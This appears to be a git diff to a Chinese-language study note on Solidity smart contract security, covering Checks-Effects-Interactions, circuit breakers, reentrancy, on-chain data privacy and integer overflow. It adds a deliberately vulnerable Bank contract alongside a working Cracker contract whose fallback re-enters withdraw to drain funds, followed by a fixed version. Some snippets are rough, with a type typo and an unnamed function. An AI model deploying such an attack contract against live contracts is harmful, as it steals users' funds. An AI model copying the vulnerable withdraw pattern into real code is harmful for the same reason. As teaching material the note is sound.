@@ -547,6 +547,17 @@ contract Sample{
 
 
 ## 安全問題
+- 再smart contract中容易出現安全問題的地方包刮 third party dev kit 、 code有邏輯漏洞，另外再電子錢包也有一定的風險，所以再發布contract 或是使用跟blockchain有關的東西時，最好都抱持著 【系統不是絕對安全】的心態
+### 0. Condition Effects Interaction
+主要訴求function可以依照三個階段來設計，特別針對像是 Reentrancy這類的問題
+
+* Condition(check)
+確認執行function的條件，比如 輸入的參數 或是 其他變動的參數
+* Effects
+更新state(狀態)
+* Interaction 
+將message傳給其他contract
+
 ### 1. Withdraw 問題
 這類情況發生在於，Auction Contract拍賣合約，把退錢的function和投標的function寫在一起時，容易產生的安全問題。問題在於`.transfer()`會直接呼叫對應address的 fallback function，如果Cracker以contract address 投標，並且在contract fallback function動手腳，像是加入`revert()`，那後續投標價格高的人會一直trigger `revert()`，導致Cracker成為投標最高的人；所以最安全的解法是投標和退錢function分開處理，拆開來寫的意思，投標不受影響，Cracker就算用同樣的方式，會是他的損失，因為沒辦法拿回錢。
 
@@ -672,7 +683,7 @@ contract Hack{
 ```
 
 ### 4. Circuit Breaker 
-主要訴求，contract可以有階段性的機制來控制function呼叫順序，並確保function不會被惡意啟動
+主要訴求，contract可以有階段性的機制來控制function呼叫順序，並確保function不會被惡意啟動，或是另外設定一個參數作為contract啟動和結束的功能，反正就是給每個function 執行條件限制
 
 主要提出要點：`enum`搭配`modifier`的使用
 ```javascript
@@ -713,38 +724,51 @@ contract StepByStep{
 
 * Risky
 ```javascript
-pragma solidity^0.4.25;
+pragma solidity ^0.4.25;
 contract Bank{
     mapping(address => uint256) public balances;
     event ContractBalances(uint256);
     event Withdraw(address _taker, uint256 _value);
-
+    
     function deposit() public payable{
-        balances[msg.sender] = msg.value;
+        balances[msg.sender] += msg.value;
     }
 
     function withdraw(address _taker) public {
         require(balances[_taker] > 0);
-        emit ContractBalances(address(this.balance));
+        emit ContractBalances(address(this).balance);
 
-        _taker.transfer(balances[_taker]);
+        
+        //這邊是關鍵寫法，如果以 _taker.transfer(balances[_taker]); 會是不通的，不過我也不知道為什麼，好像是constructor 沒有payable，可能得看transfer怎麼寫的
+        if(!(_taker.call.value(balances[_taker])())){
+            throw;
+        }
 
         emit Withdraw(_taker,balances[_taker]);
 
         balances[_taker] = 0;
         
     }
+    function balancess() public view returns(uint256){
+        return address(this).balance;
+    }
 }
 contract Cracker{
     address targetAttack;
+    address public CrackerContract;
+    address owner;
     event HackStatus(bool _status);
+    
     constructor(address _target) public payable{
         targetAttack = _target;
+        CrackerContract = address(this);
+        owner = msg.sender;
     }
-
-    function () payable{
-        if(!targetAttack.call.value(address(this).balance)(bytes4(keccak256("withdraw()")))){
-            emit HackStatus(false);
+    
+    function () payable public{
+        // targetAttack.call(bytes4(keccak256("withdraw(address)")),CrackerContract);
+        if(!targetAttack.call(bytes4(keccak256("withdraw(address)")),CrackerContract)){
+            emit HackStatus(false); //log 會全部集中在 triggeWithdraw() 所發出的Transaction上面
         }else{
             emit HackStatus(true);
         }
@@ -755,7 +779,14 @@ contract Cracker{
     }
 
     function triggeWithdraw() public{
-        targetAttack.call.value(address(this).balance)(bytes4(keccak256("withdraw()")));
+        targetAttack.call(bytes4(keccak256("withdraw(address)")),CrackerContract);
+    }
+    
+    function balancess() public view returns(uint256){
+        return address(this).balance;
+    }
+    function withdraw() public {
+        owner.transfer(address(this).balance);
     }
 }
 ```
@@ -764,11 +795,29 @@ contract Cracker{
 ```javascript
 pragma solidity^0.4.25;
 contract Bank{
+    ...
+    ...
+    function withdraw(address _taker) public {
+        require(balances[_taker] > 0);
+        emit ContractBalances(address(this).balance);
+        
+        //基本上就是先將_taker的餘額歸零就可以解決
+        uint256 pending = balances[_taker];
+        balances[_taker] = 0;
 
+        if(!(_taker.call.value(pending)())){
+            throw;
+        }
+
+        emit Withdraw(_taker,balances[_taker]);
+
+        
+        
+    }
+    ...
+    ...
 }
-contract Cracker{
-    
-}
+
 ```
 
 
@@ -806,7 +855,7 @@ filter.watch((err,result)=>{
 
 * 文中有提到一個不錯的點，`block.timestamp`是指 Tx 被確認的時間點，也就是Tx 所在的Block被Mine進Blockchain的時間點
 
-### Contract State
+### 8. Contract State
 主要訴求，在deploy contract 或是 call contract 裡面的function時，所指定的function 和 輸入的參數，都會包含在每一筆送出去的Transaction，所以最好不要將個資或是重要機密的資料放在smart contract裡，要不然就先加密過。
 就算將某一些 參數的 view type設定為`private`or`interval`，雖然在 call contract function 的時候是抓不到、也看不到回傳的值，不過只要 function內有用到這些type的參數，在Transaction Input還是可以解析出這些隱藏的參數值
 
@@ -879,4 +928,20 @@ web3.toAscii('0x4150504c45'); //回傳結果是 "APPLE"
 eth.getStorageAt()
 ```
 
-### Overflow
+### 9. Overflow
+overflow 溢位是一般常見的安全性問題，主要描述數值 value 超過型別 Type 的長度，會從最初始值開始
+
+* 解決方法，是在每個function內加入，確認value不能超過type所規定的長度，以免發生數值錯誤
+
+* 如果輸入參數為256，由於參數type是`uin8`，會被轉化為0，如果為257，會被轉化為1
+```javascript
+pragma solidity^0.4.25;
+contract A{
+    uint8 public num; //uint8 = 2**8 = 0~255
+    function (uint8 _num) public {
+        // require(_num <= 255); 加入確認function，避免發生overflow問題
+        // require(num + _num > num);
+        num += _num;
+    }
+}
+```
